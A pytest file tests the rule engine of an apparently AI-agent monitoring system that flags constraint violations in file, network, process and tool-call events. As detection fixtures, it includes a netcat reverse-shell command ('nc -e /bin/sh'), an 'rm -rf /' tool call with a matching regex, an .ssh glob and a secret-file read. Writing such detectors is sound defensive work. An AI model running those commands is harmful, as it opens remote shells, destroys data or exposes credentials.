import json
from collections.abc import AsyncIterator
from dataclasses import dataclass
from datetime import UTC, datetime, timedelta
from pathlib import Path
from typing import Any, cast

import pytest
from test_signals import AGENT, Bench, bench, change, scenario

from aims.events import (
    BlobRef,
    ChannelInfo,
    FileAccess,
    LocalEventStore,
    NetConnect,
    ProcSignal,
    ToolCall,
)
from aims.events.schema import format_ts
from aims.monitor.config import MonitorConfig, Rule
from aims.monitor.signals.base import SignalError, SignalSetup
from aims.monitor.signals.engine import SignalEngine
from aims.monitor.signals.rules import (
    _hashable,
    compile_glob,
    compile_rule,
    rule_signal,
    rules_digest,
    validate_rules,
)

pytestmark = pytest.mark.anyio


@pytest.fixture
async def store(tmp_path: Path) -> AsyncIterator[LocalEventStore]:
    async with await LocalEventStore.open(tmp_path / "runs") as store:
        yield store


def rule(**f: Any) -> Rule:
    base: dict[str, Any] = {
        "id": "r",
        "title": "rule",
        "event": ["file.access"],
        "category": "constraint_violation",
        "importance": 3,
    }
    return Rule.model_validate({**base, **f})


def problems(**f: Any) -> list[str]:
    return validate_rules([rule(**f)])


def test_a_sound_rule_validates() -> None:
    assert (
        problems(
            match={"op": ["write", "rename"], "path|glob": "/work/**", "agent_written": False},
            filter=[{"phase": "setup"}, {"path|endswith|any": [".pyc", ".tmp"]}],
            key="{path} {agent}",
        )
        == []
    )
    assert problems(event=["fs.change"], match={"timestomp": True}) == []
    assert problems(filter=[]) == []
    assert problems(event=["proc.exec"], match={"fds.1.kind": "pipe", "argv.0|re": "^py"}) == []
    assert problems(event=["fs.snapshot"], match={"changes.path|startswith": "/work"}) == []
    assert problems(event=["run.started"], match={"config.anything.below": 1}) == []


@pytest.mark.parametrize(
    ("fields", "message"),
    [
        ({"event": ["file.nothing"]}, "unknown event type file.nothing"),
        ({"event": ["monitor.flag"]}, "unknown event type monitor.flag"),
        ({"match": {"nope": 1}}, "has no field 'nope'"),
        ({"event": ["proc.exec"], "match": {"fds.3.ino": 1}}, "has no field 'fds.3.ino'"),
        ({"event": ["proc.exec"], "match": {"path.deeper": "x"}}, "has no field 'path.deeper'"),
        ({"event": ["file.access", "net.connect"], "match": {"op": "read"}}, "net.connect has no"),
        ({"match": {"target_in_tree": True}}, "does not apply to file.access"),
        ({"match": {"phase.x": 1}}, "has no parts"),
        ({"match": {"path|regex": "x"}}, "unknown modifier regex"),
        ({"match": {"path|glob|re": "x"}}, "at most one comparison"),
        ({"match": {"path|any|all": "x"}}, "at most one comparison"),
        ({"match": {"path|re": "("}}, "bad regex"),
        ({"match": {"path|cidr": "10.0.0.0/33"}}, "is not a network"),
        ({"match": {"errno|gt": "1"}}, "gt takes a number"),
        ({"match": {"path|contains": 1}}, "contains takes text"),
        ({"match": {"path|exists": "yes"}}, "exists takes true or false"),
        ({"match": {"path": []}}, "an empty list matches nothing"),
        ({"match": {"path": {"a": 1}}}, "is not a scalar"),
        ({"filter": [{"nope|contains": "x"}]}, "filter 1: file.access has no field"),
        ({"filter": {}}, "filter 1: an empty filter excludes every event"),
        ({"filter": [{"phase": "setup"}, {}]}, "filter 2: an empty filter excludes every event"),
        ({"key": "{nope}"}, "key: file.access has no field 'nope'"),
        ({"key": "{path"}, "unbalanced braces"),
    ],
)
def test_validation_errors(fields: dict[str, Any], message: str) -> None:
    found = problems(**fields)
    assert found, fields
    assert any(message in p for p in found), found
    assert all(p.startswith("rule r:") for p in found)
    with pytest.raises(SignalError):
        compile_rule(rule(**fields))


def test_globs() -> None:
    assert compile_glob("*.pth")("/usr/lib/site-packages/x.pth")
    assert not compile_glob("/work/*.py")("/work/a/b.py")
    assert compile_glob("/work/**")("/work/a/b.py")
    assert compile_glob("**/.ssh/**")("/home/agent/.ssh/id")
    assert not compile_glob("/work/test_*.py")("/work/__pycache__/test_a.cpython-313.pyc")


async def run_rule(
    store: LocalEventStore, r: Rule, *, config: dict[str, Any] | None = None
) -> Bench:
    return await bench(store, config=MonitorConfig(preset="signals", rules=[r], **(config or {})))


async def test_match_lists_or_all_and_filters(store: LocalEventStore) -> None:
    r = rule(
        match={"op": ["write", "delete"], "path|startswith|all": ["/work/", "/work/src"]},
        filter=[{"path|endswith": ".pyc"}],
        key="{op} {path}",
    )
    b = await run_rule(store, r)
    await b.bash(
        "x",
        lambda ex: b.k(FileAccess, ex, op="write", path="/work/src/a.py"),
        lambda ex: b.k(FileAccess, ex, op="read", path="/work/src/b.py"),
        lambda ex: b.k(FileAccess, ex, op="delete", path="/work/c.py"),
        lambda ex: b.k(FileAccess, ex, op="delete", path="/work/src/c.pyc"),
        lambda ex: b.k(FileAccess, ex, op="delete", path="/work/src/d.py"),
    )
    flags = b.of("r")
    assert [f.key for f in flags] == ["write /work/src/a.py", "delete /work/src/d.py"]
    assert all(f.justification.startswith("rule: ") for f in flags)
    assert all(
        (f.category, f.importance, f.layer) == ("constraint_violation", 3, "signal") for f in flags
    )


async def test_modifiers_on_numbers_networks_and_lists(store: LocalEventStore) -> None:
    rules = [
        rule(
            id="net",
            event=["net.connect"],
            match={"address|cidr": ["10.0.0.0/8", "fd00::/8"], "port|gte": 1000, "port|lt": 2000},
            key="{address}",
        ),
        rule(
            id="args",
            event=["proc.exec"],
            match={"argv|contains": "secret", "argv.0": "cat"},
            key="{argv}",
        ),
        rule(id="none", event=["proc.exec"], match={"argv.1|exists": False}, key="{program}"),
        rule(id="re", event=["tool.call"], match={"arguments|re": r"\brm\s+-rf\b"}, key="{name}"),
    ]
    b = await bench(store, config=MonitorConfig(preset="signals", rules=rules))
    await b.bash(
        "x",
        lambda ex: b.k(
            NetConnect, ex, kind="connect", family="inet", address="10.1.2.3", port=1500
        ),
        lambda ex: b.k(
            NetConnect, ex, kind="connect", family="inet", address="10.1.2.4", port=2000
        ),
        lambda ex: b.k(
            NetConnect, ex, kind="connect", family="inet6", address="::ffff:10.0.0.1", port=1000
        ),
        lambda ex: b.k(
            NetConnect, ex, kind="connect", family="inet", address="11.0.0.1", port=1500
        ),
        lambda ex: b.proc(ex, ["cat", "/work/secret.txt"]),
        lambda ex: b.proc(ex, ["head", "secret"]),
        lambda ex: b.proc(ex, ["ls"]),
    )
    await b.call("bash", {"command": "rm -rf /"})
    assert [f.key for f in b.of("net")] == ["10.1.2.3", "::ffff:10.0.0.1"]
    assert [f.key for f in b.of("args")] == ["cat /work/secret.txt"]
    assert [f.key for f in b.of("none")] == ["ls"]
    assert [f.key for f in b.of("re")] == ["bash"]


async def test_scope_and_derived_fields(store: LocalEventStore) -> None:
    rules = [
        rule(
            id="mine",
            event=["file.access"],
            scope={"phase": ["agent"], "agent": [AGENT]},
            match={"agent_written": True, "op": "read"},
            key="{path} {tool} {step}",
        ),
        rule(
            id="sig", event=["proc.signal"], match={"target_in_tree": False}, key="{target_agent}"
        ),
    ]
    b = await bench(store, config=MonitorConfig(preset="signals", rules=rules))
    await b.bash("x", lambda ex: b.k(FileAccess, ex, op="write", path="/work/a.py"))
    await b.bash(
        "y",
        lambda ex: b.k(FileAccess, ex, op="read", path="/work/a.py"),
        lambda ex: b.k(FileAccess, ex, op="read", path="/work/b.py"),
        lambda ex: b.k(ProcSignal, ex, target=ex.root, signal=15),
        lambda ex: b.k(ProcSignal, ex, target=99999, signal=15),
    )
    v = await b.exec("score", phase="verifier")
    await b.emit(b.k(FileAccess, v, op="read", path="/work/a.py"))
    assert [f.key for f in b.of("mine")] == ["/work/a.py bash 2"]
    assert [f.key for f in b.of("sig")] == [None]


async def test_rules_see_snapshot_changes_and_blob_content(store: LocalEventStore) -> None:
    rules = [
        rule(
            id="snap",
            event=["fs.change"],
            match={"path|glob": "*.sh", "change": "added"},
            filter=[{"phase": ["setup", "verifier"]}],
            key="{path}",
        ),
        rule(id="long", event=["tool.call"], match={"arguments|contains": "NEEDLE"}, key="{name}"),
    ]
    b = await bench(store, config=MonitorConfig(preset="signals", rules=rules))
    ex = await b.bash("x")
    await b.snapshot(ex, change("/work/run.sh"), change("/work/a.py"))
    setup = await b.exec("seed", phase="setup")
    await b.snapshot(setup, change("/work/seed.sh"))
    big = json.dumps({"command": "x" * 20_000 + "NEEDLE"})
    blob = await b.store.content(b.run_id, big)
    assert not isinstance(blob, str)
    await b.emit(ToolCall(call_id="big", name="bash", arguments=blob))
    assert [f.key for f in b.of("snap")] == ["/work/run.sh"]
    assert [f.key for f in b.of("long")] == ["bash"]


async def test_scenario_rules_obey_signal_options(store: LocalEventStore) -> None:
    r = rule(match={"op": "write"})
    off = MonitorConfig(preset="signals", rules=[r.model_copy(update={"enabled": False})])
    b = await bench(store, config=off)
    await b.bash("x", lambda ex: b.k(FileAccess, ex, op="write", path="/work/a"))
    assert b.of("r") == []
    louder = MonitorConfig(preset="signals", rules=[r], signals={"r": {"importance": 5}})
    b = await bench(store, config=louder)
    await b.bash("x", lambda ex: b.k(FileAccess, ex, op="write", path="/work/a"))
    assert [f.importance for f in b.of("r")] == [5]
    with pytest.raises(SignalError, match=r"signal r"):
        SignalEngine(
            MonitorConfig(preset="signals", rules=[r], signals={"r": {"options": {"x": 1}}}),
            b.scenario,
            run_id=b.run_id,
            store=store,
        )
    with pytest.raises(SignalError, match="bad regex"):
        SignalEngine(
            MonitorConfig(preset="signals", rules=[rule(match={"path|re": "["})]),
            b.scenario,
            run_id=b.run_id,
            store=store,
        )


async def test_the_most_important_matching_rule_of_a_signal_wins(store: LocalEventStore) -> None:
    b = await bench(store)
    await b.bash(
        "nc",
        lambda ex: b.proc(ex, ["nc", "-e", "/bin/sh", "host", "1"]),
    )
    (flag,) = b.of("net_tool_exec")
    assert (flag.importance, flag.justification) == (3, "netcat with a command to run: nc")


async def test_a_rule_counts_matches_per_agent_and_window(
    store: LocalEventStore, monkeypatch: pytest.MonkeyPatch
) -> None:
    r = rule(
        match={"op": "write"},
        count=3,
        window_s=10,
        key="{path}",
    )
    b = await run_rule(store, r)
    await b.bash(
        "x",
        lambda ex: [b.k(FileAccess, ex, op="write", path="/work/a") for _ in range(2)],
    )
    assert b.of("r") == []
    await b.bash(
        "x",
        lambda ex: [b.k(FileAccess, ex, op="write", path="/work/a") for _ in range(3)],
    )
    (flag,) = b.of("r")
    assert len(flag.evidence) == 3

    clock = datetime(2026, 1, 1, tzinfo=UTC)
    monkeypatch.setattr("aims.events.store.now", lambda: format_ts(clock))
    r = rule(match={"op": "write"}, count=3, window_s=0.5, key="{path}")
    b = await run_rule(store, r)
    await b.bash("x", lambda ex: b.k(FileAccess, ex, op="write", path="/work/a"))
    clock += timedelta(seconds=1)
    await b.bash(
        "x",
        lambda ex: [b.k(FileAccess, ex, op="write", path="/work/a") for _ in range(2)],
    )
    assert b.of("r") == []
    await b.bash("x", lambda ex: b.k(FileAccess, ex, op="write", path="/work/a"))
    assert len(b.of("r")) == 1


async def test_a_rule_counts_a_field_distinctly(store: LocalEventStore) -> None:
    r = rule(
        match={"op": "write"},
        count=2,
        window_s=10,
        distinct="path",
        key="{path}",
    )
    b = await run_rule(store, r)
    await b.bash(
        "x",
        lambda ex: [b.k(FileAccess, ex, op="write", path="/work/a") for _ in range(2)],
    )
    assert b.of("r") == []
    await b.bash(
        "x",
        lambda ex: [
            b.k(FileAccess, ex, op="write", path="/work/a"),
            b.k(FileAccess, ex, op="write", path="/work/b"),
        ],
    )
    assert len(b.of("r")) == 1


async def test_a_windowed_distinct_rule_forgets_a_value_once_its_last_match_expires(
    store: LocalEventStore, monkeypatch: pytest.MonkeyPatch
) -> None:
    clock = datetime(2026, 1, 1, tzinfo=UTC)
    monkeypatch.setattr("aims.events.store.now", lambda: format_ts(clock))
    r = rule(event=["tool.call"], count=2, window_s=10, distinct="name", key="{name}")
    b = await run_rule(store, r)
    flags: list[int] = []
    for after, name in [(0, "a"), (5, "a"), (7, "b"), (20, "a"), (11, "b"), (1, "a")]:
        clock += timedelta(seconds=after)
        await b.call(name, {"x": 1})
        flags.append(len(b.of("r")))
    assert flags == [0, 0, 1, 1, 1, 2]
    calls = [e.seq for e in b.events if e.type == "tool.call"]
    assert [f.evidence for f in b.of("r")] == [calls[1:3], calls[4:6]]


@dataclass(frozen=True)
class Fed:
    """The parts of an event a rule signal reads."""

    seq: int
    agent_id: str | None
    ts: datetime
    type: str


class Hashed:
    """A value that counts how often it is hashed."""

    def __init__(self) -> None:
        self.calls = 0

    def __hash__(self) -> int:
        self.calls += 1
        return 0


class Holds:
    """A state that gives every event the same payload."""

    def __init__(self, payload: Any) -> None:
        self.held = payload

    def payload(self, event: Any) -> Any:
        return self.held


async def test_a_windowed_distinct_rule_does_not_scan_its_window_on_each_match() -> None:
    r = rule(event=["tool.call"], count=2, window_s=3600, distinct="name")
    signal = rule_signal(r)(SignalSetup(MonitorConfig(preset="signals"), scenario(), {}))
    value = Hashed()
    # Built without checks, the payload can hold a value that counts its hashes.
    state = cast(Any, Holds(ToolCall.model_construct(call_id="c", name=value, arguments="{}")))
    start = datetime(2026, 1, 1, tzinfo=UTC)
    matches = 2_000
    for i in range(matches):
        event = Fed(i, AGENT, start + timedelta(milliseconds=i), "tool.call")
        assert await signal.feed(cast(Any, event), state) == []
    assert value.calls < 10 * matches


@pytest.mark.parametrize(
    ("names", "flagged"),
    [
        ("a b c", True),
        ("a b a a c", True),
        ("a a a b b b c", True),
        ("a a b b a b", False),
    ],
)
async def test_a_distinct_rule_without_a_window_keeps_every_value(
    store: LocalEventStore, names: str, flagged: bool
) -> None:
    r = rule(event=["tool.call"], count=3, distinct="name", key="{name}")
    b = await run_rule(store, r)
    for name in names.split():
        await b.call(name, {"x": 1})
    calls = [e for e in b.events if e.type == "tool.call"]
    if not flagged:
        assert b.of("r") == []
        return
    (flag,) = b.of("r")
    firsts: dict[str, int] = {}
    for e in calls:
        firsts.setdefault(str(e.data["name"]), e.seq)
    assert flag.evidence == list(firsts.values())


def test_a_distinct_rule_without_a_window_has_a_new_version() -> None:
    whole = rule(event=["tool.call"], count=3, distinct="name")
    assert rule_signal(whole).version == f"{rules_digest([whole])[:12]}.2"
    windowed = rule(event=["tool.call"], count=3, distinct="name", window_s=10)
    assert rule_signal(windowed).version == rules_digest([windowed])[:12]


async def test_a_rule_rate_without_a_window_starts_over_once_it_flags(
    store: LocalEventStore,
) -> None:
    r = rule(event=["tool.call"], count=2, distinct="name")
    b = await run_rule(store, r)
    for name in ["a", "b", "a", "a", "c", "c", "b"]:
        await b.call(name, {"x": 1})
    await b.close()
    assert b.of("r")[-1].count == 3


@pytest.mark.parametrize("window_s", [None, 10])
async def test_a_rule_counts_distinct_lists(store: LocalEventStore, window_s: float | None) -> None:
    r = rule(
        event=["proc.exec"],
        match={"path|startswith": "/usr/bin/"},
        count=2,
        window_s=window_s,
        distinct="argv",
        key="{program}",
    )
    b = await run_rule(store, r)
    ex = await b.exec("x")
    same = await b.emit(b.proc(ex, ["ls", "-l"]), b.proc(ex, ["ls", "-l"]))
    assert b.of("r") == []
    (other,) = await b.emit(b.proc(ex, ["ls", "-la"]))
    (flag,) = b.of("r")
    assert b.others == []
    seqs = [e.seq for e in [*same, other]]
    assert flag.evidence == (seqs if window_s else [seqs[0], seqs[2]])


async def test_a_rule_counts_distinct_maps_whatever_their_order(store: LocalEventStore) -> None:
    r = rule(event=["exec.started"], count=2, distinct="env", key="{command}")
    b = await run_rule(store, r)
    await b.exec("a", env={"A": "1", "B": "2"})
    await b.exec("b", env={"B": "2", "A": "1"})
    assert b.of("r") == []
    await b.exec("c", env={"A": "1"})
    assert [f.key for f in b.of("r")] == ["c"]
    assert b.others == []


def test_distinct_values_of_every_shape_compare_by_content() -> None:
    blob = BlobRef(sha256="0" * 64, size=1)
    folder = {"name": "n", "kind": "folder", "members": ["a", "b"]}
    same = [
        (["ls", "-l"], ["ls", "-l"]),
        ({"a": [1, {"b": None}], "c": 2.5}, {"c": 2.5, "a": [1, {"b": None}]}),
        (ChannelInfo.model_validate(folder), ChannelInfo.model_validate(folder)),
        ([change("/work/a")], [change("/work/a")]),
        (blob, BlobRef(sha256="0" * 64, size=1)),
        ("x", "x"),
        (3, 3),
        (None, None),
    ]
    for x, y in same:
        assert _hashable(x) == _hashable(y)
        assert hash(_hashable(x)) == hash(_hashable(y))
    differ = [
        (["ls", "-l"], ["-l", "ls"]),
        ({"a": [1]}, {"a": [2]}),
        ({"a": 1}, [["a", 1]]),
        (ChannelInfo.model_validate(folder), {**folder, "path": None, "read_only": []}),
        (ChannelInfo.model_validate(folder), ChannelInfo.model_validate(folder | {"members": []})),
        ([change("/work/a")], [change("/work/b")]),
        ([], None),
    ]
    for x, y in differ:
        assert _hashable(x) != _hashable(y)


@pytest.mark.parametrize(
    ("fields", "suffix"),
    [
        ({"event": ["proc.exec"], "distinct": "argv"}, ".3"),
        ({"event": ["proc.exec"], "distinct": "argv", "window_s": 10}, ".3"),
        ({"event": ["exec.started"], "distinct": "env", "window_s": 10}, ".3"),
        ({"event": ["run.started"], "distinct": "config.x", "window_s": 10}, ".3"),
        ({"event": ["run.started"], "distinct": "channels.0", "window_s": 10}, ".3"),
        ({"event": ["fs.snapshot"], "distinct": "changes", "window_s": 10}, ".3"),
        ({"event": ["proc.exec"], "distinct": "argv.0"}, ".2"),
        ({"event": ["proc.exec"], "distinct": "argv.0", "window_s": 10}, ""),
        ({"event": ["proc.exec"], "distinct": "fds", "window_s": 10}, ""),
        ({"event": ["proc.exec"], "distinct": "program", "window_s": 10}, ""),
        ({"event": ["fs.snapshot"], "distinct": "changes.path", "window_s": 10}, ""),
        ({"event": ["tool.call"], "distinct": "arguments", "window_s": 10}, ""),
        ({"event": ["tool.call"], "distinct": True, "window_s": 10}, ""),
    ],
)
def test_a_rule_that_counts_lists_or_maps_has_a_new_version(
    fields: dict[str, Any], suffix: str
) -> None:
    r = rule(count=2, **fields)
    assert rule_signal(r).version == f"{rules_digest([r])[:12]}{suffix}"


async def test_rule_rate_counts_do_not_mix_agents(store: LocalEventStore) -> None:
    from aims.scenario import Scenario

    sc = Scenario.model_validate(
        {
            "version": 1,
            "name": "two",
            "oversight": "observe",
            "task": {"instruction": "x", "environment": {"image": "python:3.13"}},
            "agents": [{"id": "a"}, {"id": "b"}],
        }
    )
    r = rule(match={"op": "write"}, count=3, window_s=10, key="{path}")
    b = await bench(store, config=MonitorConfig(preset="signals", rules=[r]), scenario=sc)
    for agent in ("a", "b"):
        await b.bash(
            "x",
            lambda ex: [b.k(FileAccess, ex, op="write", path="/work/a") for _ in range(2)],
            agent=agent,
        )
    assert b.of("r") == []
    await b.bash(
        "x",
        lambda ex: b.k(FileAccess, ex, op="write", path="/work/a"),
        agent="a",
    )
    assert len(b.of("r")) == 1


def test_a_distinct_field_must_exist() -> None:
    assert any("distinct" in p for p in problems(distinct="nope"))
